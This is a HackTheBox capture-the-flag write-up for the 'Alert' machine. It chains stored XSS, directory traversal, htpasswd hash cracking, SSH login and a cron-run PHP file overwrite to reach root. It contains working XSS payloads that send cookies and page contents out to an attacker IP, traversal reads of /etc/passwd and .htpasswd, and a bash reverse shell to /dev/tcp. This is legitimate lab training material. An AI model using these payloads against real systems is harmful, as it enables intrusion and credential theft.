---
render_with_liquid: false
title: HackTheBox Writeup - Alert
date: 2024-12-02 03:56:03 +1400
tags: [hackthebox, nmap, linux, feroxbuster, php, gobuster, subdomain, simplehttpserver, xss, xss-stored, client-side-attack, xss-proxy, directory-traversal, htpasswd, hashcat, credentials-stuffing, pspy, scheduled-job-abuse]
image:
    path: https://labs.hackthebox.com/storage/avatars/6f4647030d6aadc676b8d8a459de344f.png
    width: 640
    height: 480
---



Alert is an easy-difficulty Linux machine with a website to upload, view, and share markdown files. The site is vulnerable to cross-site scripting (XSS), which is exploited to access an internal page vulnerable to Arbitrary File Read and leveraged to gain access to a password hash. The hash is then cracked to reveal the credentials leveraged to gain `SSH` access to the target. Enumeration of processes running on the system shows a `PHP` file that is being executed regularly, which has excessive privileges for the management group our user is a member of and allows us to overwrite the file for code execution as root.

# Recon
---

## Hosts

```bash
┌──(bravosec㉿fsociety)-[~/htb/Alert]
└─$ pt init '10.10.11.44 alert.htb statistics.alert.htb'
+---------+--------+-------------+----------------------+
| PROFILE | STATUS |     IP      |        DOMAIN        |
+---------+--------+-------------+----------------------+
| alert   | on     | 10.10.11.44 | alert.htb            |
| alert   | on     | 10.10.11.44 | statistics.alert.htb |
+---------+--------+-------------+----------------------+
```

## Nmap

```bash

# Nmap 7.94SVN scan initiated Mon Dec  2 03:56:02 2024 as: /usr/lib/nmap/nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80, 10.10.11.44
Nmap scan report for 10.10.11.44
Host is up, received user-set (0.20s latency).
Scanned at 2024-12-02 03:56:03 CST for 13s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7e:46:2c:46:6e:e6:d1:eb:2d:9d:34:25:e6:36:14:a7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDSrBVJEKTgtUohrzoK9i67CgzqLAxnhEsPmW8hS5CFFGYikUduAcNkKsmmgQI09Q+6pa+7YHsnxcerBnW0taI//IYB5TI/LSE3yUxyk/ROkKLXPNiNGUhC6QiCj3ZTvThyHrFD9ZTxWfZKEQTcOiPs15+HRPCZepPouRtREGwmJcvDal1ix8p/2/C8X57ekouEEpIk1wzDTG5AM2/D08gXXe0TP+KYEaZEzAKM/mQUAqNTxfjc9x5rlfPYW+50kTDwtyKta57tBkkRCnnns0YRnPNtt0AH374ZkYLcqpzxwN8iTNXaeVT/dGfF4mA1uW89hSMarmiRgRh20Y1KIaInHjv9YcvSlbWz+2sz3ev725d4IExQTvDR4sfUAdysIX/q1iNpleyRgM4cvDMjxD6lEKpvQYSWVlRoJwbUUnJqnmZXboRwzRl+V3XCUaABJrA/1K1gvJfsPcU5LX303CV6LDwvLJIcgXlEbtjhkcxz7b7CS78BEW9hPifCUDGKfUs=
|   256 45:7b:20:95:ec:17:c5:b4:d8:86:50:81:e0:8c:e8:b8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHYLF+puo27gFRX69GBeZJqCeHN3ps2BScsUhKoDV66yEPMOo/Sn588F/wqBnJxsPB3KSFH+kbYW2M6erFI3U5k=
|   256 cb:92:ad:6b:fc:c8:8e:5e:9f:8c:a2:69:1b:6d:d0:f7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG/QUl3gapBOWCGEHplsOKe2NlWjlrb5vTTLjg6gMuGl
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://alert.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Mon Dec  2 03:56:16 2024 -- 1 IP address (1 host up) scanned in 13.82 seconds
```


## 80 - HTTP : Markdown Viewer


### Info

```ruby
http://alert.htb [302,200] [Alert - Markdown Viewer] [Apache/2.4.41 (Ubuntu)] [http://alert.htb:80/index.php?page=alert] [a1eaaf5143cfb17b25921a7f97ade7d8703ae83d] [Apache HTTP Server:2.4.41,Ubuntu]
```

![](/assets/obsidian/566b410d03306bc58cae22f4f9f7176d.png)

### Directory

```bash
feroxbuster -w <(cat /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt|anew) -k --auto-tune -A -u "http://$(pt get rhost):80" -o ferox_80.txt -n
```

```bash
301      GET        9l       28w      308c http://alert.htb/uploads => http://alert.htb/uploads/
302      GET       23l       48w      660c http://alert.htb/ => index.php?page=alert
301      GET        9l       28w      304c http://alert.htb/css => http://alert.htb/css/
200      GET      182l      385w     3622c http://alert.htb/css/style.css
302      GET       23l       48w      660c http://alert.htb/index.php => index.php?page=alert
301      GET        9l       28w      309c http://alert.htb/messages => http://alert.htb/messages/
```

### Subdomains

```bash
┌──(bravosec㉿fsociety)-[~/htb/Alert]
└─$ gobuster vhost --append-domain -o gobuster_vhosts.txt -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -k -t 100 -u http://alert.htb -r
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://alert.htb
[+] Method:          GET
[+] Threads:         100
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: statistics.alert.htb Status: 401 [Size: 467]
Found: *.alert.htb Status: 400 [Size: 301]
Progress: 100000 / 100001 (100.00%)
===============================================================
Finished
===============================================================
```

# User Flag
---

## Shell as albert


### 80 - Markdown Viewer : XSS (Stored)

Start up a http server with verbose result info

```bash
PORT="80"; fuser -k "$PORT/tcp" 2>/dev/null; simplehttpserver -listen "0.0.0.0:$PORT" -verbose
```

Write a javascript payload for XSS, use `img` tag to check if any user views the page, `a` tag to check if any user clicks on links

> `test.md`

```javascript
<img src="http://10.10.14.3/a"/><a href="http://10.10.14.3/b">Test</a>
```

Upload the markdown file

> http://alert.htb/index.php?page=alert

![](/assets/obsidian/23d8da5976453c0edd92b522a9fd1f11.png)

The HTML tags did render in the output, which means it's vulnerable to cross-site-scripting (**XSS**)

![](/assets/obsidian/f35ee00ccf6f1139ceb7de297a9823d3.png)

The `Share Markdown` button generated a link : `http://alert.htb/visualizer.php?link_share=6750dcd77f7a34.84494813.md`, which reveals the uploaded file name

The file was uploaded to `http://alert.htb/uploads/6750dcd77f7a34.84494813.md`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Alert]
└─$ curl http://alert.htb/uploads/6750dcd77f7a34.84494813.md
<img src="http://10.10.14.3/a"/><a href="http://10.10.14.3/b">Test</a>
```

By uploading `rev.phar`, the backend informs that only `.md` files are **white-listed**, which is unlikely bypass-able

![](/assets/obsidian/b0738b0dd15d35fac2ea0ede95a139b2.png)

![](/assets/obsidian/cfc8dd9223d6b52b8bfd92833f273088.png)

### 80 - Contact form : Discovering client side interaction

In the `about` page, it informed that `Administrator` will review the contact messages

> http://alert.htb/index.php?page=about

![](/assets/obsidian/a86d6b4920a9711ebe4d3d558ee5a96a.png)

> http://alert.htb/index.php?page=contact

![](/assets/obsidian/bbc3bf4e60ed22ffd0b41e021ac064ef.png)

```javascript
<img src="http://10.10.14.3/a"/><a href="http://10.10.14.3/b">Test</a>
```

![](/assets/obsidian/6eaac8cea32e06054e20bbce03ffa177.png)

Our http server got 2 hits right after the message submission

```bash
[2024-12-02 07:18:27]
Remote Address: 10.10.11.44:55484
GET /a&quot;/&gt;&lt;a HTTP/1.1
Host: 10.10.14.3
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/122.0.6261.111 Safari/537.36


HTTP/1.1 404 Not Found
Content-Type: text/plain; charset=utf-8
X-Content-Type-Options: nosniff



[2024-12-02 07:18:30]
Remote Address: 10.10.11.44:55484
GET /b&quot;&gt;Test&lt;/a&gt; HTTP/1.1
Host: 10.10.14.3
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/122.0.6261.111 Safari/537.36


HTTP/1.1 404 Not Found
Content-Type: text/plain; charset=utf-8
X-Content-Type-Options: nosniff
```

It still got a hit by just submitting the http server link only, which means there's a browser automation program simulating a user to open links in the message

![](/assets/obsidian/7fd555c89f9dd260fe228a2bbde2c471.png)

```bash
[2024-12-02 07:22:22]
Remote Address: 10.10.11.44:42866
GET /a HTTP/1.1
Host: 10.10.14.3
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/122.0.6261.111 Safari/537.36
```

### 80 - Contact form : Client side attack via XSS

By uploading a `javascript` code as markdown and sending the generated link that was given to the contact form, it will make the code execute in the context of `alert.htb` domain

Which means it can do things such as stealing cookies, local storage items from the domain or make web requests on behalf of the victim side

After uploading `test.md` to http://alert.htb/index.php?page=alert, a link was generated : `http://alert.htb/visualizer.php?link_share=6750e1e5975704.34737432.md`

> `test.md`

```javascript
<script>fetch("http://10.10.14.3/c/"+btoa(document.cookie));</script>
```

Submit it to contact form

![](/assets/obsidian/35b4afcd472cc7eefee5590a435b524f.png)

Unfortunately there were no cookies retrieved, it might have used `httponly` flag for cookies, local storage authentication token or IP address for administrator access check

```bash
[2024-12-02 07:34:00]
Remote Address: 10.10.11.44:45538
GET /c/ HTTP/1.1
Host: 10.10.14.3
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Origin: http://alert.htb
Referer: http://alert.htb/
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/122.0.6261.111 Safari/537.36
```

Since we discovered an endpoint : `/messages/`, it's interesting to test with administrator access

Result without administrator access :

```bash
┌──(bravosec㉿fsociety)-[~/htb/Alert]
└─$ curl http://alert.htb/messages/
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at alert.htb Port 80</address>
</body></html>
```

By using the `page` parameter, `/messages/` is accessible but nothing there

```bash
┌──(bravosec㉿fsociety)-[~/htb/Alert]
└─$ curl http://alert.htb/index.php?page=messages
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/style.css">
    <title>Alert - Markdown Viewer</title>
</head>
<body>
    <nav>
        <a href="index.php?page=alert">Markdown Viewer</a>
        <a href="index.php?page=contact">Contact Us</a>
        <a href="index.php?page=about">About Us</a>
        <a href="index.php?page=donate">Donate</a>
            </nav>
    <div class="container">

    </div>
    <footer>
        <p style="color: black;">© 2024 Alert. All rights reserved.</p>
    </footer>
</body>
</html>
```

Write a `javascript` using `XMLHttpRequest` to send a `GET` request to `http://alert.htb/messages/`, encode the response in base64 then send it back to my http server

> `~/www/main.js`

```javascript
(function () {
    const data_url = 'http://10.10.14.3/data'
    const url = 'http://alert.htb/index.php?page=messages'
    const xhrLocal = new XMLHttpRequest();
    
    xhrLocal.open('GET', url, true); // Enable credentials for cross-origin requests
    xhrLocal.withCredentials = true;
    xhrLocal.onreadystatechange = function () {
        if (xhrLocal.readyState === 4) {
            const localData = xhrLocal.responseText;

            const targetURL = `${data_url}/${btoa(localData)}`;
            const xhrForward = new XMLHttpRequest();
            xhrForward.open('GET', targetURL, true);
            xhrForward.send();
        }
    };
    xhrLocal.send();
})();
```

Start http server with logging enabled

```bash
PORT="80"; fuser -k "$PORT/tcp" 2>/dev/null; simplehttpserver -listen "0.0.0.0:$PORT" 2>&1 | tee simplehttpserver.log
```

Auto extract the base64 result from the http server's logs

```bash
tail -n +1 -F simplehttpserver.log | stdbuf -oL grep -oP '(?<=/data/)[^ ]+' | stdbuf -oL tee result.b64
```

Upload the script loader as markdown file, got a link : `http://alert.htb/visualizer.php?link_share=6750e780e2d634.85086749.md`

> `test.md`

```javascript
<script src="http://10.10.14.3/main.js"></script>
```

Send the link to contact form

![](/assets/obsidian/a37d4d59c9e6923c9128ff98251ce49d.png)

![](/assets/obsidian/efe2311548cfd099728e95e768022a03.png)

There's another URI revealed : `messages.php?file=2024-03-10_15-48-34.txt`

```bash
┌──(bravosec㉿fsociety)-[~/www]
└─$ cat result.b64 | tail -n1 | base64 -d
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/style.css">
    <title>Alert - Markdown Viewer</title>
</head>
<body>
    <nav>
        <a href="index.php?page=alert">Markdown Viewer</a>
        <a href="index.php?page=contact">Contact Us</a>
        <a href="index.php?page=about">About Us</a>
        <a href="index.php?page=donate">Donate</a>
        <a href="index.php?page=messages">Messages</a>    </nav>
    <div class="container">
        <h1>Messages</h1><ul><li><a href='messages.php?file=2024-03-10_15-48-34.txt'>2024-03-10_15-48-34.txt</a></li></ul>
    </div>
    <footer>
        <p style="color: black;"> 2024 Alert. All rights reserved.</p>
    </footer>
</body>
</html>
```

Change the script to visit `messages.php?file=2024-03-10_15-48-34.txt`

```javascript
[...]
const url = 'http://alert.htb/messages.php?file=2024-03-10_15-48-34.txt'
[...]
```

Nothing is in the file

```bash
┌──(bravosec㉿fsociety)-[~/www]
└─$ cat result.b64 | tail -n1 | base64 -d
<pre></pre>
```

### 80 - messages.php : Directory traversal

It's vulnerable to **directory traversal**

```javascript
[...]
const url = 'http://alert.htb/messages.php?file=../../../../../etc/passwd'
[...]
```

```bash
┌──(bravosec㉿fsociety)-[~/www]
└─$ cat result.b64 | tail -n1 | base64 -d | sed -e 's/<pre>//g' -e 's/<\/pre>//g'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
albert:x:1000:1000:albert:/home/albert:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
david:x:1001:1002:,,,:/home/david:/bin/bash
```

Check users with shell

```bash
┌──(bravosec㉿fsociety)-[~/www]
└─$ cat result.b64 | tail -n1 | base64 -d | sed -e 's/<pre>//g' -e 's/<\/pre>//g' | grep sh$
root:x:0:0:root:/root:/bin/bash
albert:x:1000:1000:albert:/home/albert:/bin/bash
david:x:1001:1002:,,,:/home/david:/bin/bash
```

Tried to get ssh private key and bash history from all user home directory but failed (`/home/albert/.ssh/id_rsa`, `/home/albert/.bash_history`, ...)

Check source codes

```javascript
[...]
const url = 'http://alert.htb/messages.php?file=../messages.php'
[...]
```

- It's using `file_get_contents`, LFI is not possilbe

```bash
┌──(bravosec㉿fsociety)-[~/www]
└─$ cat result.b64 | tail -n1 | base64 -d | sed -e 's/<pre>//g' -e 's/<\/pre>//g'
<?php
$ip = $_SERVER['REMOTE_ADDR'];
if ($ip == '127.0.0.1' || $ip == '::1') {
    $directory = "messages/";

    $messages = glob($directory . "*.txt");

    if (isset($_GET['file'])) {
        $file = $_GET['file'];
        echo "" . file_get_contents($directory . $file) . "";
    } else {
        echo "<h1>Messages</h1>";
        if (count($messages) > 0) {
            echo "<ul>";
            foreach ($messages as $message) {
                $filename = basename($message);
                echo "<li><a href='messages.php?file=$filename'>$filename</a></li>";
            }
            echo "</ul>";
        } else {
            echo "No messages found.";
        }
    }
}
?>
```

```javascript
[...]
const url = 'http://alert.htb/messages.php?file=../visualizer.php'
[...]
```

- The file upload can't be bypassed and there's no other vulnerabilities in the code

```bash
┌──(bravosec㉿fsociety)-[~/www]
└─$ cat result.b64 | tail -n1 | base64 -d | sed -e 's/<pre>//g' -e 's/<\/pre>//g'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Alert - Markdown Viewer</title>
    <link rel="stylesheet" href="css/style.css">
    <style>
        .share-button {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background-color: rgb(100, 100, 100);
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <?php
    function showMarkdown($filename) {
        $uploadDirectory = 'uploads/';
        if (preg_match('/^[a-zA-Z0-9_.-]+\.md$/', $filename)) {
            $filePath = $uploadDirectory . $filename;
            if (file_exists($filePath) && is_readable($filePath)) {
                require 'Parsedown.php';
                $parsedown = new Parsedown();
                echo $parsedown->text(file_get_contents($filePath));
            } else {
                echo "Error: Invalid file.";
            }
        } else {
            echo "Error: Invalid file name.";
        }
    }

    if (isset($_GET['link_share'])) {
        $filename = $_GET['link_share'];
        showMarkdown($filename);
    } elseif (isset($_FILES['file'])) {
        $file = $_FILES['file'];
        if ($file['error'] === UPLOAD_ERR_OK) {
            $fileName = $file['name'];
            $fileExtension = pathinfo($fileName, PATHINFO_EXTENSION);
            if ($fileExtension === 'md') {
                $uploadDirectory = 'uploads/';
                if (!file_exists($uploadDirectory)) {
                    mkdir($uploadDirectory, 0777, true);
                }

                $newFilename = uniqid('', true) . '.' . $fileExtension;
                if (move_uploaded_file($file['tmp_name'], $uploadDirectory . $newFilename)) {
                    $shareLink = 'http://alert.htb/visualizer.php?link_share=' . $newFilename;
                    showMarkdown($newFilename);
                    echo '<a class="share-button" href="' . $shareLink . '" target="_blank">Share Markdown</a>';
                } else {
                    echo "Error uploading file.";
                }
            } else {
                echo "Error: File must be a Markdown file (.md).";
            }
        } else {
            echo "Error uploading file.";
        }
    } else {
        echo "Please upload a Markdown file.";
    }
    ?>
</body>
</html>
```

Since `statistics.alert.htb` returns `401` Unauthorized code, it's worth to get the `.htpasswd` file from the web root

Get **apache** default sites config

```javascript
[...]
const url = 'http://alert.htb/messages.php?file=../../../../etc/apache2/sites-enabled/000-default.conf'
[...]
```

Luckily the default site config contains `statistics.alert.htb`, so we can get the file location of `.htpasswd` easily

```bash
┌──(bravosec㉿fsociety)-[~/www]
└─$ cat result.b64 | tail -n1 | base64 -d | sed -e 's/<pre>//g' -e 's/<\/pre>//g'
<VirtualHost *:80>
    ServerName alert.htb

    DocumentRoot /var/www/alert.htb

    <Directory /var/www/alert.htb>
        Options FollowSymLinks MultiViews
        AllowOverride All
    </Directory>

    RewriteEngine On
    RewriteCond %{HTTP_HOST} !^alert\.htb$
    RewriteCond %{HTTP_HOST} !^$
    RewriteRule ^/?(.*)$ http://alert.htb/$1 [R=301,L]

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

<VirtualHost *:80>
    ServerName statistics.alert.htb

    DocumentRoot /var/www/statistics.alert.htb

    <Directory /var/www/statistics.alert.htb>
        Options FollowSymLinks MultiViews
        AllowOverride All
    </Directory>

    <Directory /var/www/statistics.alert.htb>
        Options Indexes FollowSymLinks MultiViews
        AllowOverride All
        AuthType Basic
        AuthName "Restricted Area"
        AuthUserFile /var/www/statistics.alert.htb/.htpasswd
        Require valid-user
    </Directory>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```

Get `/var/www/statistics.alert.htb/.htpasswd` and crack the hashes

```javascript
[...]
const url = 'http://alert.htb/messages.php?file=../../../../var/www/statistics.alert.htb/.htpasswd'
[...]
```

```bash
┌──(bravosec㉿fsociety)-[~/www]
└─$ cat result.b64 | tail -n1 | base64 -d | sed -e 's/<pre>//g' -e 's/<\/pre>//g' | tee ~/htb/Alert/loot/htpasswd
albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Alert]
└─$ hashcat loot/htpasswd /opt/wordlists/rockyou.txt --user
hashcat (v6.2.6) starting in autodetect mode
[...]
$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/:manchesterunited
[...]
```

### 22 - SSH : Credential stuffing

```bash
┌──(bravosec㉿fsociety)-[~/htb/Alert]
└─$ cssh $(pt get rhost) albert 'manchesterunited'
Warning: Permanently added 'alert.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-200-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu 05 Dec 2024 12:55:56 AM UTC

  System load:           0.02
  Usage of /:            63.7% of 5.03GB
  Memory usage:          17%
  Swap usage:            0%
  Processes:             246
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.44
  IPv6 address for eth0: dead:beef::250:56ff:feb9:3090


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Dec  4 21:59:01 2024 from 10.10.14.147
albert@alert:~$ id
uid=1000(albert) gid=1000(albert) groups=1000(albert),1001(management)
albert@alert:~$ cat user.txt
c88cf3cdd184cbf9a8e4b7f003357839
```

# Root Flag
---

## From albert to david


### Abuse Cron Job - Writeable php file

The none-default group `management` seems interesting, find what it owns

- `albert` can write to `opt/website-monitor/config/`

```bash
albert@alert:~$ find / -not -path "/proc/*" -not -path "/run/*" -not -path "/sys/*" -not -path "/var/lib/*" -group management -ls 2>/dev/null
     8299      4 drwxrwxr-x   2 root     management     4096 Dec  5 00:58 /opt/website-monitor/config
      531      4 -rwxrwxr-x   1 albert   management       49 Dec  5 01:00 /opt/website-monitor/config/configuration.php
albert@alert:~$ cat /opt/website-monitor/config/configuration.php
<?php
define('PATH', '/opt/website-monitor');
?>
albert@alert:~$ ls -latr /opt/website-monitor
total 96
drwxr-xr-x 4 root root        4096 Oct 12 00:58 ..
-rwxrwxr-x 1 root root        1068 Oct 12 00:58 LICENSE
drwxrwxr-x 2 root root        4096 Oct 12 00:58 updates
-rwxrwxr-x 1 root root        1918 Oct 12 00:58 style.css
-rwxrwxr-x 1 root root        1657 Oct 12 00:58 README.md
-rwxrwxr-x 1 root root       40849 Oct 12 00:58 Parsedown.php
drwxrwxr-x 2 root root        4096 Oct 12 00:58 incidents
drwxrwxr-x 8 root root        4096 Oct 12 00:58 .git
-rwxrwxr-x 1 root root        1452 Oct 12 01:00 monitor.php
-rwxrwxr-x 1 root root        5323 Oct 12 01:00 index.php
-rwxrwxr-x 1 root root         104 Oct 12 01:07 monitors.json
drwxrwxr-x 7 root root        4096 Oct 12 01:07 .
drwxrwxrwx 2 root root        4096 Oct 12 01:07 monitors
drwxrwxr-x 2 root management  4096 Dec  5 00:58 config
```

- `127.0.0.1:8080` is the internal web app for `/opt/website-monitor`, and it runs as `root`

```bash
albert@alert:~$ ss -ltnp | awk '$4 !~ /0.0.0.0|::/'
State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port  Process
LISTEN   0        4096       127.0.0.53%lo:53            0.0.0.0:*
LISTEN   3        4096           127.0.0.1:8080          0.0.0.0:*
LISTEN   0        511                    *:80                  *:*
albert@alert:~$ ps auxfwwww
[...]
root         995  0.0  0.6 207256 26432 ?        Ss   Dec04   0:00 /usr/bin/php -S 127.0.0.1:8080 -t /opt/website-monitor
[...]
```

Run **pspy**

```bash
wget 10.10.14.3/pspy64 -O /dev/shm/p && chmod +x /dev/shm/p && /dev/shm/p -t 20480
```

From **pspy**'s result, there's a script constantly executing `/opt/website-monitor/config/configuration.php` as `root`

![](/assets/obsidian/36067c8fcbe144a1e5e6146382ed22a9.png)

Start reverse shell listener

```bash
┌──(bravosec㉿fsociety)-[~/htb/Alert]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
```

Write php reverse shell to `/opt/website-monitor/config/configuration.php`

```bash
cat << EOF > /opt/website-monitor/config/configuration.php
<?php system("/bin/bash -c 'bash -i > /dev/tcp/10.10.14.3/1111 0>&1'"); ?>
EOF
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Alert]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.11.44] 38350
/usr/bin/script -qc /bin/bash /dev/null
root@alert:~# ^Z
zsh: suspended  nc -lvnp 1111

┌──(bravosec㉿fsociety)-[~/htb/Alert]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1111
                               export TERM=xterm
root@alert:~# stty rows 50 columns 209
root@alert:~# id
uid=0(root) gid=0(root) groups=0(root)
root@alert:~# cat root.txt
6978ec6e5657b9264c225aab4c92b665
```

# Additional
---
